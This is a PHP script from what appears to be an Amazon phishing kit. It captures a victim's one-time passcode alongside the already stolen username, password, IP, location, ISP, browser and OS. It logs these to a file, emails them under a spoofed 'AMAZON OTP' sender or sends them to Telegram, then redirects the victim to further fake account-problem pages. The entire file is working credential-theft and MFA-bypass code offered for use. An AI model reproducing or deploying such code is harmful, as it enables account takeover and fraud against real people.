<?php
require __DIR__ . '/../function.php';

$_SESSION['otp'] = $_POST[$api->encypt('otp')];

$message = file_get_contents(__DIR__ . "/Template/otp.html");
$message = preg_replace('{GLITCH-RANDOM}', $_SESSION['key'], $message);
$message = preg_replace('{GLITCH-DATE}', date('D d M Y'), $message);
$message = preg_replace('{GLITCH-USERNAME}', $_SESSION['username'], $message);
$message = preg_replace('{GLITCH-PASSWORD}', $_SESSION['password'], $message);
$message = preg_replace('{GLITCH-OTP}', $_SESSION['otp'], $message);
$message = preg_replace('{GLITCH-CITY}', $_SESSION['city'], $message);
$message = preg_replace('{GLITCH-STATE}', $_SESSION['state'], $message);
$message = preg_replace('{GLITCH-IP}', $_SESSION['ip'], $message);
$message = preg_replace('{GLITCH-HOST}', $_SESSION['host'], $message);
$message = preg_replace('{GLITCH-ISP}', $_SESSION['isp'], $message);
$message = preg_replace('{GLITCH-OS}', $_SESSION['os'], $message);
$message = preg_replace('{GLITCH-BROWSER}', $_SESSION['browser'], $message);
$message = preg_replace('{GLITCH-USERAGENT}', $_SESSION['useragent'], $message);

$subject = "(I) {$_SESSION['masked_username']} OTP // {$_SESSION['country']} - {$_SESSION['ip']} - {$_SESSION['os']} - {$_SESSION['browser']}";
$headers = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
$headers .= "From: AMAZON OTP <notifications@glitchlabs.zone>";

$logs = "(I) " . date('d M Y H:i A') . "|" . $_SESSION['username'] . "|OTP:" . $_SESSION['otp'] . "|" . $_SESSION['ip'] . "|" . $_SESSION['country'];
$api->save($api->logs("otp"), $logs."\n", "a");
  
if ($api->config("resulttoemail") == "on") {
    if ($api->config("sending") == "smtp") {
        $api->send($api->result(), $subject, $message, 'AMAZON OTP');
    } elseif ($api->config("sending") == "mail") {
        @mail($api->result(), $subject, $message, $headers);
    }
}

if ($api->config("resulttotelegram") == "on") {
    $msg = $api->generateOTPMessage(
        $_SESSION['username'], $_SESSION['password'], $_SESSION['otp'], 
        date('D d M Y'), $_SESSION['ip'], $_SESSION['isp'], $_SESSION['country'], $_SESSION['state'], $_SESSION['city'], $_SESSION['browser'], $_SESSION['os']
    );
    $api->sendTelegram($msg);
}

if ($api->config("doubleotp") == "on") {
    $api->redirectPage("/ax/approval", "/ap/approval", "&error=true");
}

switch ($api->config("case")) {
    case "off":
        $api->redirectPage("/ax/account/addresses", "/ap/account/addresses");
        break;
    case "unusual":
        $api->redirectPage("/ax/account-unusual", "/ap/account-unusual");
        break;
    case "billing-problem":
        $api->redirectPage("/ax/billing-problem", "/ap/billing-problem");
        break;
    case "locked":
        $api->redirectPage("/ax/account-locked", "/ap/account-locked");
        break;
    case "prime":
        $api->redirectPage("/ax/prime-pause", "/ap/prime-pause");
        break;
}
?>